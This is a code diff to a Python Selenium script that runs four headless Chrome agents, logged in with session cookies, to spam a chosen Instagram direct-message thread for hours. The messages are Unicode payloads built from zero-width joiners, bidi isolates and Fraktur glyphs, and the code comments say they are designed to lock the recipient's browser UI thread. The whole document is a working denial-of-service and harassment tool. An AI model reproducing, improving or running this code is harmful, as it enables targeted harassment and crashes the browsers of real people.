@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (MATRIX-BREAKER V26)
-# 📅 STATUS: MAIN-THREAD-FREEZE | 4-AGENT TOTAL | CSS-SHAPER-ATTACK
+# 🚀 PROJECT: PRAVEER.OWNS (INPUT-LOCK V27)
+# 📅 STATUS: UI-THREAD-LOCK | 4-AGENT TOTAL | DOM-SATURATION
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -13,7 +13,7 @@ from selenium.webdriver.chrome.options import Options
 # --- 4 AGENTS TOTAL CONFIG ---
 AGENTS_PER_MACHINE = 2             
 TOTAL_DURATION = 25000 
-BURST_SPEED = (0.2, 0.5)    
+BURST_SPEED = (0.2, 0.4)    
 REST_AFTER_STRIKES = 100   
 REST_DURATION = 5          
 
@@ -22,24 +22,22 @@ COUNTER_LOCK = threading.Lock()
 BROWSER_LAUNCH_LOCK = threading.Lock()
 sys.stdout.reconfigure(encoding='utf-8')
 
-def get_matrix_breaker_payload():
-    """Generates a payload targeting the CSS Font-Feature mapping logic."""
+def get_input_lock_payload():
+    """Generates a payload that locks the browser's UI event loop."""
     u_id = random.randint(1000, 9999)
-    # \u2060 = Word Joiner
-    # \u2068 = First Strong Isolate
-    # \u202D / \u202E = BiDi Overrides
-    glue, iso, pop = "\u2060", "\u2068", "\u2069"
+    # \u200D = Zero Width Joiner (Forces infinite glyph lookup)
+    # \u2060 = Word Joiner (Prevents the browser from breaking the line)
+    # \u2068 = Isolate (Forces new render context)
+    zwj, glue, iso, pop = "\u200D", "\u2060", "\u2068", "\u2069"
     
-    header = f"👑 PRAVEER OWNS THE MATRIX 👑 [KERNEL_THREAT:{u_id}]"
+    header = f"👑 PRAVEER OWNS THE MATRIX 👑 [LOCK_ID:{u_id}]"
     
     body = []
-    # Using 'Mathematical Fraktur' and 'Monospace' blocks. 
-    # Switching between these character sets forces the browser to 
-    # re-map the Font-Feature table 300+ times per message.
-    for i in range(290):
-        bidi = "\u202E" if i % 2 == 0 else "\u202D"
-        # The mix of Fraktur and Monospace prevents the browser from using its render-cache.
-        line = f"{iso}{bidi} 𝕻 𝚁 𝕬 𝚅 𝕰 𝙴 𝚁 {i} 𝕻 𝕬 𝕻 𝕬 {pop}{glue}"
+    # We bond 280 lines into a single logical "Object"
+    # The browser cannot process button clicks until this object is shaped.
+    for i in range(280):
+        # Mixing Fraktur and Standard text inside ZWJ chains
+        line = f"{iso}𝕻{zwj}X{zwj}{i}{zwj}𝕬{zwj}O{pop}{glue}"
         body.append(line)
         
     return f"{header}\n{glue.join(body)}".strip()[:9998]
@@ -55,9 +53,7 @@ def get_driver(agent_id):
         chrome_options.add_argument("--headless=new") 
         chrome_options.add_argument("--no-sandbox") 
         chrome_options.add_argument("--disable-dev-shm-usage")
-        # Direct GPU pressure
-        chrome_options.add_argument("--enable-gpu-rasterization")
-        chrome_options.add_argument("--js-flags='--max-old-space-size=4096'")
+        chrome_options.add_argument("--disable-gpu")
         
         ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
         chrome_options.add_argument(f"user-agent={ua}")
@@ -72,6 +68,7 @@ def get_driver(agent_id):
 def adaptive_send(driver, text):
     try:
         box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
+        # Direct JS injection to avoid browser-side input lag on your end
         driver.execute_script("arguments[0].focus(); document.execCommand('insertText', false, arguments[1]);", box, text)
         time.sleep(0.3)
         box.send_keys(Keys.ENTER)
@@ -90,9 +87,9 @@ def run_life_cycle(agent_id, cookie, target):
             driver.get(f"https://www.instagram.com/direct/t/{target}/")
             time.sleep(15) 
             
-            if adaptive_send(driver, "🚀 MATRIX-BREAKER SYSTEM ONLINE"):
+            if adaptive_send(driver, "🚀 INPUT-LOCK MATRIX ONLINE"):
                 while (time.time() - global_start) < TOTAL_DURATION:
-                    payload = get_matrix_breaker_payload()
+                    payload = get_input_lock_payload()
                     if adaptive_send(driver, payload):
                         strike_counter += 1
                         with COUNTER_LOCK:
